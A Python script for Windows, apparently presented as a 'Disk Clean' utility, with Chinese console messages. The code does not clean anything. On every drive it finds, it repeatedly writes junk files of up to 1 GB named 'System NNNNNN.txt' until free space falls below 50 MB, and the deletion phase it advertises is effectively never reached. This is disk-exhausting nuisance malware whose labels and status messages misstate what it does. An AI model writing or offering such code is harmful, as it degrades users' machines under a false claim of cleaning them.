import time
import threading
import string
import os
import ctypes
import random

def diskclean_thread():
    KB = 1024
    MB = KB * 1024
    GB = MB * 1024

    def get_free_space(drive):
        free_bytes = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(drive, ctypes.byref(free_bytes), 0, 0)
        return free_bytes.value

    def random_string(length):
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))

    def get_drives(thing):
        not_wrote = list(string.ascii_uppercase)

        while True:
            letter = random.choice(not_wrote)
            root = letter + ':\\'
            if os.path.exists(root):
                folder = os.path.join(root, '磁盘清理 - Disk Clean')
                if not os.path.exists(folder):
                    os.mkdir(folder)
                for file in os.listdir(folder):
                    os.remove(os.path.join(folder, file))

                free_space = get_free_space(root)
                if free_space < 50 * MB:
                    print(f'磁盘 {root} 剩余空间不足！')
                    not_wrote.remove(letter)
                    continue
                size = random.randint(MB, min(GB, free_space // 10))
                file_id = random.randint(100000, 999999)

                filename = os.path.join(folder, 'System ' + str(file_id) + '.txt')
                thing(filename, size)
            else:
                not_wrote.remove(letter)
    
    print('磁盘清理线程启动！')
    line_choices = [random_string(MB) for _ in range(32)]
    print('随机行数据生成完成，开始写入文件：')

    def write_file(filename, size):
        line_count = size // MB
        with open(filename, 'w') as f:
            for i in range(line_count):
                if i % 13 == 0:
                    print(f'\r写入行 {i+1}/{line_count} 到 {filename} 中，进度 {(i+1)/line_count:.2%}...', end='')
                f.write(random.choice(line_choices) + '\n')
        print(f'\r写入一个文件 {filename} 结束，共写入 {line_count} 行。')
    
    def do_nothing(filename, size):
        del filename, size

    while True:
        get_drives(write_file)
        print('写入完成，休眠三十秒！！！')
        time.sleep(30)
        get_drives(do_nothing)
        print('清理完成，休眠三十秒！！！')
        time.sleep(30)

threading.Thread(target=diskclean_thread).start()
